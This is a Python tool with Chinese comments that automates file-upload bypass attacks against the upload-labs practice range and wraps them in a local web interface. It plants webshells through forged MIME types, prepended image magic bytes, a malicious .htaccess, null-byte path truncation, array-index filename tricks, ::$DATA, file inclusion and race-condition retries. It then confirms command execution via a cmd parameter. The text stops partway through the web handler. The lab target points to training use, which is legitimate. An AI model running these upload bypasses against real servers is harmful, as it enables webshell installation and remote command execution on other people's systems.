import os
import io
import mimetypes
import requests
import re
from bs4 import BeautifulSoup
import urllib.parse
import sys
from http.server import HTTPServer, BaseHTTPRequestHandler

base_url = "http://192.168.52.130"
clear_path = "rmdir.php?action=clean_upload_file"
uploaded_file_path = None
saved_path_value = None

a= "aa"

num = "01"
encoded_url_1 = "%00"
decoded_url_1 = urllib.parse.unquote(encoded_url_1)


def upload(url, file_path, proxies=None, timeout=30, fake_file_name=None, fake_mime_type=None, magic_type_input=None, is_htaccess=0, is_bp=0, is_data=0, save_path=None, save_name=None, save_name_0=None, save_name_2=None, test_id=None):
    # 检查URL是否以http://或https://开头
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    
    # 如果is_bp为1，设置代理为Burp Suite代理
    if is_bp == 1:
        proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
        print("[info]使用Burp Suite代理: http://127.0.0.1:8080")
    # 处理proxies参数
    elif proxies and isinstance(proxies, str):
        if proxies.startswith(('http://', 'https://')):
            proxies = {'http': proxies, 'https': proxies}
        else:
            proxies = None
            
    # 如果is_htaccess为1，先上传.htaccess文件
    if is_htaccess == 1:
        print("[info]正在上传.htaccess文件...")
        htaccess_content = b'SetHandler application/x-httpd-php'
        
        # 定义请求头部
        headers = {
            'Host': url.split('//')[1].split('/')[0],
            'Cache-Control': 'max-age=0',
            'Accept-Language': 'zh-CN,zh;q=0.9',
            'Origin': url.split('/')[0] + '//' + url.split('//')[1].split('/')[0],
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Referer': url,
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive'
        }
        
        # 准备.htaccess文件
        files = {
            'upload_file': ('.htaccess', io.BytesIO(htaccess_content), 'image/png')
        }
        
        data = {
            'submit': '上传'
        }
        
        # 发送请求上传.htaccess文件
        htaccess_response = requests.post(url, headers=headers, files=files, data=data, proxies=proxies, timeout=timeout)
        
        if "不正确" in htaccess_response.text:
            print("[Fail].htaccess文件上传失败")
        else:
            print("[Success].htaccess文件上传成功")

    # 检查本地文件是否存在
    if not os.path.exists(file_path):
        print(f"错误: 文件 '{file_path}' 不存在!")
        return
        
    # 检查伪造名是否为空
    if fake_file_name is None:
        fake_file_name = os.path.basename(file_path)
    
    # 如果没有指定fake_mime_type，则获取文件本身的MIME类型
    if fake_mime_type is None:
        fake_mime_type = mimetypes.guess_type(file_path)[0] or 'application/octet-stream'
        print(f"[info]使用文件本身的MIME类型: {fake_mime_type}")
    else:
        print(f"[info]使用伪造的MIME类型: {fake_mime_type}")
    
    # 定义请求头部
    headers = {
        'Host': url.split('//')[1].split('/')[0],
        'Cache-Control': 'max-age=0',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'Origin': url.split('/')[0] + '//' + url.split('//')[1].split('/')[0],
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Referer': url,
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive'
    }

    # 处理文件内容，如果需要添加魔术字节
    with open(file_path, 'rb') as f:
        file_content = f.read()
    
    # 如果指定了magic_type_input，向文件头部添加字节值
    if magic_type_input:
        magic_bytes = None
        if magic_type_input.lower() == 'gif':
            # GIF89a 魔术字节
            magic_bytes = b'GIF89a'
            print("添加GIF文件头魔术字节")
        elif magic_type_input.lower() == 'jpg' or magic_type_input.lower() == 'jpeg':
            # JPEG 魔术字节 (JFIF标记)
            magic_bytes = b'\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01'
            print("添加JPEG文件头魔术字节")
        elif magic_type_input.lower() == 'png':
            # PNG 魔术字节
            magic_bytes = b'\x89PNG\r\n\x1a\n'
            print("添加PNG文件头魔术字节")
        
        if magic_bytes:
            # 确保不重复添加魔术字节
            if not file_content.startswith(magic_bytes):
                file_content = magic_bytes + file_content
                print(f"已添加{magic_type_input}文件头魔术字节")
    
    # 使用修改后的文件内容
    files = {
        'upload_file': (fake_file_name, io.BytesIO(file_content), fake_mime_type)
    }

    data = {
        'submit': '上传'
    }
    
    # 如果提供了save_path参数，添加到data中
    if save_path:
        global saved_path_value
        # 删除路径中的前导 "../"
        if save_path.startswith(".."):
            saved_path_value = save_path[3:]
        else:
            saved_path_value = save_path
        # 将decoded_url_1的值也放入save_path中
        modified_save_path = save_path + decoded_url_1
        data[f'save_path'] = modified_save_path
        print(f"[info]这是编译后的插入代码{decoded_url_1}11")
        print(f"[info]使用自定义保存路径: {modified_save_path}")
    
    # 如果提供了save_name参数，添加到data中
    if save_name:
        data['save_name'] = save_name
        print(f"[info]使用自定义保存文件名: {save_name}")

    # 如果提供了save_name参数，添加到data中
    if save_name_0:
        data['save_name[0]'] = save_name_0
        print(f"切割绕过: {save_name_0}")

    # 如果提供了save_name参数，添加到data中
    if save_name_2:
        data['save_name[2]'] = save_name_2
        print(f"伪造扩展名: {save_name_2}")


    response = requests.post(url, headers=headers, files=files, data=data, proxies=proxies, timeout=timeout)
    
    # # 输出响应状态和内容
    # print(f"状态码: {response.status_code}")
    # print("响应头:")
    # for header, value in response.headers.items():
    #     print(f"  {header}: {value}")
        
    # print("\n响应内容片段:")
    # print(response.text[:500] + "..." if len(response.text) > 500 else response.text)

    ########################################
    # 检查响应内容中是否包含"不正确"
    # if "不正确" in response.text:
    #     print(f"此{url}文件上传失败，响应内容: {response.text}")
    # else:
    #     print(f"此{url}文件上传成功，响应内容: {response.text}")
    #删除响应
    current_id = test_id if test_id is not None else num
    if "出错" in response.text or "错误" in response.text:
        print(f"[Fail]***Pass-{current_id}文件上传失败")
    else:
        if "成功" in response.text:
            print(f"[Success]***Pass-{current_id}文件上传成功")

        # 提取上传后的文件路径
        try:
            global uploaded_file_path
            # 使用BeautifulSoup解析HTML
            soup = BeautifulSoup(response.text, 'html.parser')
            img_div = soup.find('div', id='img')
            if img_div and img_div.find('img'):
                global uploaded_file_path
                img_src = img_div.find('img').get('src')
                # 删除路径前面的点
                if img_src.startswith('..'):
                    img_src = img_src[3:]
                print(f"[Success]文件上传成功，文件路径: /{img_src}")
                uploaded_file_path = img_src
                return response, img_src
            else:
                # 新增：提取"文件保存的路径为：xxx"格式的路径
                # 兼容中文冒号和英文冒号，以及可能的空格
                text_pattern = re.compile(r'文件保存的路径为[：:]\s*(.*?)(?:<|\s|$)', re.IGNORECASE)
                match_text = text_pattern.search(response.text)
                if match_text:
                    img_src = match_text.group(1).strip()
                    # 删除路径前面的点
                    if img_src.startswith('..'):
                        img_src = img_src[3:]
                    print(f"[Success]成功提取上传文件路径(文本匹配): {img_src}")
                    uploaded_file_path = img_src
                    return response, img_src

                # 使用正则表达式作为备用方案
                img_pattern = re.compile(r'<div id="img">.*?<img src="(.*?)".*?</div>', re.DOTALL)
                match = img_pattern.search(response.text)
                if match:
                    img_src = match.group(1)
                    # 删除路径前面的点
                    if img_src.startswith('..'):
                        img_src = img_src[3:]
                    print(f"[Success]成功提取上传文件路径: {img_src}")
                    uploaded_file_path = img_src
                    return response, img_src
                else:
                    print("[Fail]无法提取上传文件路径，请检查响应内容")
        except Exception as e:
            print(f"[Fail]提取文件路径时出错: {str(e)}")
    
    return response, None



def test_get(url, is_bp=0, pass_num=None):
    url=f'{url}?cmd=echo%20%22aiksu%22'
    print(url)
    
    # 当is_bp为1时，使用代理
    proxies = None
    if is_bp == 1:
        proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
    
    success = False
    try:
        response = requests.get(url, timeout=10, proxies=proxies)
        if response.status_code == 200:
            print("GET请求成功")
            if "aiksu" in response.text and "Warning" not in response.text:
                print("[Success]测试成功：Success")
                success = True
            else:
                print("[Fail]测试失败：Fail")
            # print("响应内容:", response.text)
        else:
            print(f"[Fail]GET请求失败，状态码: {response.status_code}")
            print("[Fail]测试失败：无法获取正确响应")
    except Exception as e:
        print(f"[Fail]请求异常: {str(e)}")
        
    return success, pass_num
        # print("响应内容:", response.text)

def test_get_2(url, is_bp=0, pass_num=None):
    url=f'{url}&cmd=echo%20%22aiksu%22'
    print(url)
    
    # 当is_bp为1时，使用代理
    proxies = None
    if is_bp == 1:
        proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
    
    success = False
    try:
        response = requests.get(url, timeout=10, proxies=proxies)
        if response.status_code == 200:
            print("GET请求成功")
            if "aiksu" in response.text and "Warning" not in response.text:
                print("[Success]测试成功：Success")
                success = True
            else:
                print("[Fail]测试失败：Fail")
            # print("响应内容:", response.text)
        else:
            print(f"[Fail]GET请求失败，状态码: {response.status_code}")
            print("[Fail]测试失败：无法获取正确响应")
    except Exception as e:
        print(f"[Fail]请求异常: {str(e)}")
        
    return success, pass_num
        # print("响应内容:", response.text)


def test_get_3(url, is_bp=0, pass_num=None):
    print(url)
    
    # 当is_bp为1时，使用代理
    proxies = None
    if is_bp == 1:
        proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
    
    success = False
    try:
        response = requests.get(url, timeout=10, proxies=proxies)
        if response.status_code == 200:
            print("GET请求成功")
            # 移除无效的空字符串检查，仅检查是否包含警告信息
            if "Warning" not in response.text:
                print("[Success]测试成功：Success")
                success = True
            else:
                print("[Fail]测试失败：Fail (发现Warning)")
            # print("响应内容:", response.text)
        else:
            print(f"[Fail]GET请求失败，状态码: {response.status_code}")
            print("[Fail]测试失败：无法获取正确响应")
    except Exception as e:
        print(f"[Fail]请求异常: {str(e)}")
        
    return success, pass_num




def clear_file(url):
    res = requests.get(url)
    if res.status_code == 200:
        # 检查返回值中是否包含"删除成功"
        if "删除成功" in res.text:
            # 提取删除的文件数量
            match = re.search(r'删除成功：(\d+)', res.text)
            if match:
                file_count = int(match.group(1))
                # 减去2后显示
                actual_count = file_count - 2
                print(f"[Success]删除成功，共删除{actual_count}个文件\n")
            else:
                print("[Success]删除成功\n")
        else:
            print("[Fail]错误：" + res.text + "\n")
    else:
        print("[Fail]清除失败\n")


def check_connectivity(target_url, timeout=5, extra_paths=None, proxies=None):
    """在执行测试前检查目标连通性与关键路径可访问性"""
    # 规范化URL前缀
    if not target_url.startswith(("http://", "https://")):
        target_url = "http://" + target_url

    print(f"[info]正在检查目标连通性: {target_url}")
    try:
        res = requests.get(target_url, timeout=timeout, proxies=proxies)
        if res.status_code >= 200 and res.status_code < 400:
            print(f"[Success]目标连通性正常，状态码: {res.status_code}")
        else:
            print(f"[Fail]目标访问异常，状态码: {res.status_code}")
            return False
    except requests.exceptions.RequestException as e:
        print(f"[Fail]目标访问失败: {str(e)}")
        return False

    # 检查额外路径
    if extra_paths:
        for path in extra_paths:
            # 保证额外路径也有协议
            if not path.startswith(("http://", "https://")):
                path = "http://" + path
            try:
                res = requests.get(path, timeout=timeout, proxies=proxies)
                if res.status_code == 200:
                    print(f"[Success]关键路径可访问: {path}")
                else:
                    print(f"[Warn]关键路径异常，状态码: {res.status_code}: {path}")
            except requests.exceptions.RequestException as e:
                print(f"[Warn]关键路径访问失败: {path} - {str(e)}")
    return True

def _capture_output(func, *args, **kwargs):
    buf = io.StringIO()
    old = sys.stdout
    sys.stdout = buf
    try:
        func(*args, **kwargs)
    finally:
        sys.stdout = old
    return buf.getvalue()

def run_auto_tests_web(base_url_input, clear_path_input):
    if not check_connectivity(base_url_input, timeout=5, extra_paths=[f"{base_url_input}/Pass-01/index.php", f"{base_url_input}/{clear_path_input}"]):
        print("[Fail]目标不可达或关键路径错误，请检查base_url后重试")
        return
    successful_tests = []
    failed_tests = []
    global uploaded_file_path
    global num
    global saved_path_value
    for i in range(1,22):
        uploaded_file_path = None
        n = str(i).zfill(2)
        num = n
        success = False
        if n == "12":
            print(f"*正在向Pass-{n}上传webshell")
            if isinstance(payload[f"{n}"], dict):
                upload(f"{base_url_input}/Pass-{n}/index.php?save_path=../upload/{n}.php%00", **payload[f"{n}"])
            else:
                upload(f"{base_url_input}/Pass-{n}/index.php?save_path=../upload/{n}.php%00", payload[f"{n}"])
            print(f"[info]正在测试Pass-{n}是否上传成功")
            success, _ = test_get(f"{base_url_input}/upload/{n}.php", pass_num=n)
            print(f"[info]正在清除Pass-{n}上传的文件")
            clear_file(f"{base_url_input}/{clear_path_input}")
            if success:
                successful_tests.append(f"Pass-{n}")
            else:
                failed_tests.append(f"Pass-{n}")
            continue
        elif n == "13":
            print(f"*正在向Pass-{n}上传webshell")
            if isinstance(payload[f"{n}"], dict):
                upload(f"{base_url_input}/Pass-{n}/index.php", **payload[f"{n}"])
            else:
                upload(f"{base_url_input}/Pass-{n}/index.php", payload[f"{n}"])
            print(f"[info]正在测试Pass-{n}是否上传成功")
            success, _ = test_get(f"{base_url_input}/{saved_path_value}", pass_num=n)
            print(f"[info]正在清除Pass-{n}上传的文件")
            clear_file(f"{base_url_input}/{clear_path_input}")
            if success:
                successful_tests.append(f"Pass-{n}")
            else:
                failed_tests.append(f"Pass-{n}")
            continue
        elif n == "09":
            print(f"*正在向Pass-{n}上传webshell")
            if isinstance(payload[f"{n}"], dict):
                upload(f"{base_url_input}/Pass-{n}/index.php", **payload[f"{n}"])
            else:
                upload(f"{base_url_input}/Pass-{n}/index.php", payload[f"{n}"])
            print(f"[info]正在测试Pass-{n}是否上传成功")
            if uploaded_file_path:
                cleaned_path = re.sub(r"::\$data", "", uploaded_file_path, flags=re.IGNORECASE)
                success, _ = test_get(f"{base_url_input}/{cleaned_path}", pass_num=n)
            else:
                print(f"[Fail]Pass-{n}文件上传失败或无法获取上传路径")
                success = False
            print(f"[info]正在清除Pass-{n}上传的文件")
            clear_file(f"{base_url_input}/{clear_path_input}")
            if success:
                successful_tests.append(f"Pass-{n}")
            else:
                failed_tests.append(f"Pass-{n}")
            continue
        elif n == "14" or n == "15" or n == "16":
            print(f"*正在向Pass-{n}上传webshell")
            if isinstance(payload[f"{n}"], dict):
                upload(f"{base_url_input}/Pass-{n}/index.php", **payload[f"{n}"])
            else:
                upload(f"{base_url_input}/Pass-{n}/index.php", payload[f"{n}"])
            print(f"[info]正在测试Pass-{n}是否上传成功")
            success, _ = test_get_2(f"{base_url_input}/include.php?file={uploaded_file_path}", pass_num=n)
            print(f"[info]正在清除Pass-{n}上传的文件")
            clear_file(f"{base_url_input}/{clear_path_input}")
            if success:
                successful_tests.append(f"Pass-{n}")
            else:
                failed_tests.append(f"Pass-{n}")
            continue
        elif n == "17":
            print(f"*正在向Pass-{n}上传webshell")
            if isinstance(payload[f"{n}"], dict):
                upload(f"{base_url_input}/Pass-{n}/index.php", **payload[f"{n}"])
            else:
                upload(f"{base_url_input}/Pass-{n}/index.php", payload[f"{n}"])
            print(f"[info]正在测试Pass-{n}是否上传成功")
            success, _ = test_get_2(f"{base_url_input}/include.php?file={uploaded_file_path}", pass_num=n)
            print(f"[info]正在清除Pass-{n}上传的文件")
            clear_file(f"{base_url_input}/{clear_path_input}")
            if success:
                successful_tests.append(f"Pass-{n}")
            else:
                failed_tests.append(f"Pass-{n}")
            continue
        elif n == "18":
            print(f"*正在向Pass-{n}上传webshell")
            retry_count = 0
            max_retries = 100
            while retry_count < max_retries:
                retry_count += 1
                try:
                    html = requests.get(f"{base_url_input}/upload/{n}.php?cmd=echo aiksu", timeout=5)
                    if 'aiksu' in str(html.text):
                        print('创建WebShell成功')
                        print(f"[info]正在清除Pass-{n}上传的文件")
                        clear_file(f"{base_url_input}/{clear_path_input}")
                        success = True
                        break
                except Exception:
                    pass
                if isinstance(payload[f"{n}"], dict):
                    upload(f"{base_url_input}/Pass-{n}/index.php", **payload[f"{n}"])
                else:
                    upload(f"{base_url_input}/Pass-{n}/index.php", payload[f"{n}"])
                print(f"[info]正在测试Pass-{n}文件包含 (尝试 {retry_count}/{max_retries})")
                test_get_3(f"{base_url_input}/include.php?file=upload/exp{n}.gif", pass_num=n)
            if not success:
                print(f"[Fail]Pass-{n}条件竞争失败，已达到最大重试次数")
            if success:
                successful_tests.append(f"Pass-{n}")
            else:
                failed_tests.append(f"Pass-{n}")
            continue
        elif n == "19":
            print(f"*正在向Pass-{n}上传webshell")
            retry_count = 0
            max_retries = 100
            while retry_count < max_retries:
                retry_count += 1
                try:
                    html = requests.get(f"{base_url_input}/upload/{n}.php?cmd=echo aiksu", timeout=5)
                    if 'aiksu' in str(html.text):
                        print('创建WebShell成功')
                        print(f"[info]正在清除Pass-{n}上传的文件")
                        clear_file(f"{base_url_input}/{clear_path_input}")
                        success = True
                        break
                except Exception:
                    pass
                if isinstance(payload[f"{n}"], dict):
                    upload(f"{base_url_input}/Pass-{n}/index.php", **payload[f"{n}"])
                else:
                    upload(f"{base_url_input}/Pass-{n}/index.php", payload[f"{n}"])
                print(f"[info]正在测试Pass-{n}文件包含 (尝试 {retry_count}/{max_retries})")
                test_get_3(f"{base_url_input}/include.php?file=uploadexp{n}.gif", pass_num=n)
            if not success:
                print(f"[Fail]Pass-{n}条件竞争失败，已达到最大重试次数")
            if success:
                successful_tests.append(f"Pass-{n}")
            else:
                failed_tests.append(f"Pass-{n}")
            continue
        print(f"*正在向Pass-{n}上传webshell")
        if isinstance(payload[f"{n}"], dict):
            upload(f"{base_url_input}/Pass-{n}/index.php", **payload[f"{n}"])
        else:
            upload(f"{base_url_input}/Pass-{n}/index.php", payload[f"{n}"])
        print(f"[info]正在测试Pass-{n}是否上传成功")
        if uploaded_file_path:
            cleaned_path = re.sub(r"::\$data", "", uploaded_file_path, flags=re.IGNORECASE)
            success, _ = test_get(f"{base_url_input}/{cleaned_path}", pass_num=n)
        else:
            print(f"[Fail]Pass-{n}文件上传失败或无法获取上传路径")
            success = False
        print(f"[info]正在清除Pass-{n}上传的文件")
        clear_file(f"{base_url_input}/{clear_path_input}")
        if success:
            successful_tests.append(f"Pass-{n}")
        else:
            failed_tests.append(f"Pass-{n}")
    print("\n" + "="*50)
    print("测试统计结果:")
    print(f"成功测试数量: {len(successful_tests)}/{21}")
    print(f"成功测试列表: {', '.join(successful_tests)}")
    print(f"失败测试数量: {len(failed_tests)}/{21}")
    if failed_tests:
        print(f"失败测试列表: {', '.join(failed_tests)}")
    print("="*50)

def run_manual_tests_web(url, file_path, proxies=None, timeout=30, fake_file_name=None, fake_mime_type=None, magic_type_input=None, is_htaccess=0, is_bp=0, is_data=0, save_path=None, test_url=None):
    if not check_connectivity(url, timeout=5):
        print("[Fail]目标不可达，请检查URL并重试")
        return
    upload(url, file_path, proxies, timeout, fake_file_name, fake_mime_type, magic_type_input, is_htaccess, is_bp, is_data, save_path)
    if test_url:
        test_get(test_url)

def run_fuzz_tests_web(url):
    if not check_connectivity(url, timeout=5):
        print("[Fail]目标不可达，请检查URL并重试")
        return
    print(f"\n[Info] 开始对 {url} 进行Fuzz测试...")
    print("-" * 50)
    successful_payloads = []
    for key, val in payload.items():
        tech_desc = bypass_tech.get(key, '未知技术')
        print(f"\n>>> 正在尝试 Payload ID: {key} [{tech_desc}]")
        kwargs = {
            'url': url,
            'timeout': 10,
            'test_id': key
        }
        if isinstance(val, dict):
            kwargs['file_path'] = val['file_path']
        else:
            kwargs['file_path'] = val
        if isinstance(val, dict):
            if 'fake_mime_type' in val: kwargs['fake_mime_type'] = val['fake_mime_type']
            if 'fake_file_name' in val: kwargs['fake_file_name'] = val['fake_file_name']
            if 'magic_type_input' in val: kwargs['magic_type_input'] = val['magic_type_input']
            if 'is_htaccess' in val: kwargs['is_htaccess'] = val['is_htaccess']
            if 'save_path' in val: kwargs['save_path'] = val['save_path']
            if 'save_name' in val: kwargs['save_name'] = val['save_name']
            if 'save_name_0' in val: kwargs['save_name_0'] = val['save_name_0']
            if 'save_name_2' in val: kwargs['save_name_2'] = val['save_name_2']
        try:
            response, uploaded_path = upload(**kwargs)
            if uploaded_path:
                print(f"[Success] Payload {key} [{tech_desc}] 上传成功! 路径: {uploaded_path}")
                successful_payloads.append(f"{key} ({tech_desc})")
                full_url = ""
                if uploaded_path.startswith("http"):
                    full_url = uploaded_path
                else:
                    base = url.rsplit('/', 1)[0]
                    if uploaded_path.startswith('/'):
                        parsed_url = urllib.parse.urlparse(url)
                        full_url = f"{parsed_url.scheme}://{parsed_url.netloc}{uploaded_path}"
                    else:
                        full_url = f"{base}/{uploaded_path}"
                print(f"[Info] 尝试访问: {full_url}")
                try:
                    check_res = requests.get(full_url, timeout=5)
                    if check_res.status_code == 200:
                        print(f"[Success] 文件可访问! 状态码: 200")
                    else:
                        print(f"[Warn] 文件访问返回状态码: {check_res.status_code}")
                except:
                    pass
            else:
                print(f"[Fail] Payload {key} 上传未返回路径")
        except Exception as e:
            print(f"[Error] Payload {key} 执行异常: {str(e)}")
    print("\n" + "="*50)
    print("Fuzz 测试完成")
    print(f"成功 Payload IDs:")
    for success_item in successful_payloads:
        print(f"  - {success_item}")
    print("="*50)

def start_web_server(host='127.0.0.1', port=8000):
    class WebHandler(BaseHTTPRequestHandler):
        def _send_html(self, content, status=200):
            body = content.encode('utf-8')
            self.send_response(status)
            self.send_header('Content-Type', 'text/html; charset=utf-8')
            self.send_header('Content-Length', str(len(body)))
            self.end_headers()
            self.wfile.write(body)
        def _page(self, title, inner, active=''):
            return f"""<!DOCTYPE html><html><head><meta charset='utf-8'><title>{title}</title><style>
:root{{--bg:linear-gradient(120deg,#0b1020,#121a2f);--nav-bg:rgba(16,24,40,.85);--panel:#111827;--surface:#0b1222;--text:#e5e7eb;--muted:#9ca3af;--primary:#3b82f6;--primary-600:#2563eb;--border:#1f2937;--hover:#0b1222;--success:#22c55e;--success-600:#16a34a;--warning:#f59e0b;--warning-600:#d97706;--danger:#ef4444;--danger-600:#dc2626;--info:#06b6d4;--info-600:#0891b2;--secondary:#64748b;--secondary-600:#475569}}
[data-theme='light']{{--bg:linear-gradient(120deg,#f4f7fb,#e9eef6);--nav-bg:rgba(255,255,255,.85);--panel:#ffffff;--surface:#f6f8fb;--text:#111827;--muted:#6b7280;--primary:#2563eb;--primary-600:#1d4ed8;--border:#e5e7eb;--hover:#f1f5f9;--success:#22c55e;--success-600:#16a34a;--warning:#f59e0b;--warning-600:#d97706;--danger:#ef4444;--danger-600:#dc2626;--info:#06b6d4;--info-600:#0891b2;--secondary:#64748b;--secondary-600:#475569}}
body{{font-family:Segoe UI,Arial; margin:0; background:var(--bg); color:var(--text)}}
.container{{max-width:980px; margin:24px auto; padding:0 16px}}
nav{{position:sticky; top:0; z-index:10; background:var(--nav-bg); backdrop-filter:blur(8px); border-bottom:1px solid var(--border)}}
.nav-inner{{display:flex; align-items:center; gap:14px; max-width:980px; margin:0 auto; padding:12px 16px}}
.brand{{font-weight:700; color:var(--text); opacity:.95; display:flex; align-items:center; gap:8px}}
.brand i{{display:inline-block; width:22px; height:22px; border-radius:6px; background:linear-gradient(135deg, var(--primary), var(--primary-600))}}
.spacer{{flex:1}}
.nav-link{{padding:6px 10px; border-radius:6px; color:var(--muted)}}
.nav-link:hover{{color:var(--text); background:var(--hover)}}
.nav-link.active{{color:var(--text); background:var(--hover); border:1px solid var(--border)}}
.btn{{display:inline-block; padding:8px 12px; border-radius:8px; border:1px solid var(--border); color:var(--text); background:var(--surface); cursor:pointer}}
.btn:hover{{background:var(--hover)}}
.btn-primary{{background:var(--primary); border-color:var(--primary-600); color:#fff}}
.btn-primary:hover{{background:var(--primary-600)}}
.btn-ghost{{background:transparent; border-color:var(--border)}}
.btn-success{{background:var(--success); border-color:var(--success-600); color:#fff}}
.btn-success:hover{{background:var(--success-600)}}
.btn-warning{{background:var(--warning); border-color:var(--warning-600); color:#111}}
.btn-warning:hover{{background:var(--warning-600); color:#fff}}
.btn-danger{{background:var(--danger); border-color:var(--danger-600); color:#fff}}
.btn-danger:hover{{background:var(--danger-600)}}
.btn-info{{background:var(--info); border-color:var(--info-600); color:#fff}}
.btn-info:hover{{background:var(--info-600)}}
.btn-secondary{{background:var(--secondary); border-color:var(--secondary-600); color:#fff}}
.btn-secondary:hover{{background:var(--secondary-600)}}
.btn[disabled]{{opacity:.6; cursor:not-allowed}}
.grid{{display:grid; grid-template-columns:1fr; gap:12px}}
@media(min-width:760px){{.grid-2{{grid-template-columns:1fr 1fr}}}}
.card{{background:var(--panel); border:1px solid var(--border); border-radius:12px; padding:16px; box-shadow:0 10px 30px rgba(0,0,0,.12)}}
.field{{display:flex; flex-direction:column; gap:6px}}
.field label{{font-size:13px; color:var(--muted)}}
input,select,textarea{{font-size:14px; padding:8px 10px; border-radius:8px; border:1px solid var(--border); background:var(--surface); color:var(--text)}}
input:focus,select:focus,textarea:focus{{outline:none; border-color:var(--primary)}}
pre{{background:var(--surface); color:var(--text); padding:12px; border-radius:10px; white-space:pre-wrap; border:1px solid var(--border); max-height:60vh; overflow:auto}}
.card-actions{{display:flex; justify-content:flex-end; margin-bottom:8px}}
.footer{{color:var(--muted); font-size:12px; text-align:center; padding:18px 0; border-top:1px solid var(--border)}}
.title{{font-size:20px; margin:8px 0 16px}}
.muted{{color:var(--muted)}}
.pill{{display:inline-block; padding:3px 8px; border-radius:999px; border:1px solid var(--border); background:var(--surface); color:var(--muted); font-size:12px}}
.bar{{height:1px; background:var(--border); margin:16px 0}}
.hero{{background:linear-gradient(135deg, rgba(59,130,246,.18), rgba(37,99,235,.18)); border:1px dashed var(--border); border-radius:14px; padding:18px; margin-bottom:16px}}
.cards{{display:grid; grid-template-columns:1fr; gap:12px}}
@media(min-width:760px){{.cards{{grid-template-columns:1fr 1fr}}}}
.card-link{{display:block; padding:14px; border-radius:12px; border:1px solid var(--border); background:var(--surface); color:var(--text)}}
.card-link:hover{{background:var(--hover)}}
.overlay{{position:fixed; inset:0; background:rgba(0,0,0,.25); display:none; align-items:center; justify-content:center; z-index:9999}}
.overlay .spinner{{width:56px; height:56px; border-radius:999px; border:5px solid var(--border); border-top-color:var(--primary); animation:spin 1s linear infinite}}
@keyframes spin{{to{{transform:rotate(360deg)}}}}
.log-success{{color:var(--success);font-weight:bold}}
.log-fail{{color:var(--danger);font-weight:bold}}
.log-warn{{color:var(--warning);font-weight:bold}}
.log-info{{color:var(--info)}}
.log-highlight{{color:var(--primary);font-weight:bold}}
</style></head><body>
<nav><div class='nav-inner'>
  <div class='brand'><i></i>Upload-Labs Tester</div>
  <a class='nav-link{' active' if active=='home' else ''}' href='/'>首页</a>
  <a class='nav-link{' active' if active=='auto' else ''}' href='/auto'>自动化测试</a>
  <a class='nav-link{' active' if active=='manual' else ''}' href='/manual'>手动测试</a>
  <a class='nav-link{' active' if active=='fuzz' else ''}' href='/fuzz'>Fuzz测试</a>
  <div class='spacer'></div>
  <a class='btn btn-ghost' href='/help' target='_blank'>帮助</a>
  <button id='theme' class='btn'>切换主题</button>
</div></nav>
<div class='container'>{inner}</div>
<div class='overlay' id='overlay'><div class='spinner'></div></div>
<div class='footer'>by aiksu</div>
<script>
  const btn=document.getElementById('theme');
  if(btn){{
    const key='ul_theme';
    const set=(v)=>{{document.documentElement.dataset.theme=v}};
    const cur=localStorage.getItem(key)||'dark';
    set(cur);
    btn.onclick=()=>{{const n=(localStorage.getItem(key)||'dark')==='dark'?'light':'dark';localStorage.setItem(key,n);set(n)}};
  }}
  const copy=document.getElementById('copy-btn');
  const log=document.getElementById('log');
  if(copy&&log){{copy.onclick=()=>{{navigator.clipboard.writeText(log.innerText)}}}}
  const dl=document.getElementById('download-btn');
  if(dl&&log){{dl.onclick=()=>{{const blob=new Blob([log.innerText],{{type:'text/plain'}}); const a=document.createElement('a'); a.href=URL.createObjectURL(blob); a.download='log.txt'; a.click(); setTimeout(()=>{{URL.revokeObjectURL(a.href)}},1000);}}}}
  const forms=document.querySelectorAll('form');
  const overlay=document.getElementById('overlay');
  forms.forEach(f=>{{f.addEventListener('submit',()=>{{if(overlay) overlay.style.display='flex'; const btns=f.querySelectorAll('button[type=\"submit\"]'); btns.forEach(b=>{{b.disabled=true; b.textContent='运行中...'}});}})}});
</script>
</body></html>"""
        def _colorize_log(self, text):
            lines = text.split('\n')
            colored_lines = []
            for line in lines:
                if '[Success]' in line or '成功' in line:
                    colored_lines.append(f"<span class='log-success'>{line}</span>")
                elif '[Fail]' in line or '[Error]' in line or '失败' in line or '错误' in line:
                    colored_lines.append(f"<span class='log-fail'>{line}</span>")
                elif '[Warn]' in line or 'Warning' in line:
                    colored_lines.append(f"<span class='log-warn'>{line}</span>")
                elif '[info]' in line.lower() or '[Info]' in line:
                    colored_lines.append(f"<span class='log-info'>{line}</span>")
                elif line.strip().startswith('*'):
                    colored_lines.append(f"<span class='log-highlight'>{line}</span>")
                else:
                    colored_lines.append(line)
            return '\n'.join(colored_lines)
        def do_GET(self):
            p = urllib.parse.urlparse(self.path)
            path = p.path
            if path == '/':
                html = self._page('首页', "<div class='hero'><div class='title'>文件上传漏洞测试网页端</div><div class='muted'>选择一个入口开始使用</div></div><div class='cards'><a class='card-link' href='/auto'><div class='title'>自动化测试</div><div class='muted'>按 Pass-01..21 批量执行</div></a><a class='card-link' href='/manual'><div class='title'>手动测试</div><div class='muted'>自定义目标与参数</div></a><a class='card-link' href='/fuzz'><div class='title'>Fuzz测试</div><div class='muted'>遍历内置 Payload 组合</div></a></div>", 'home')
                self._send_html(html)
            elif path == '/auto':
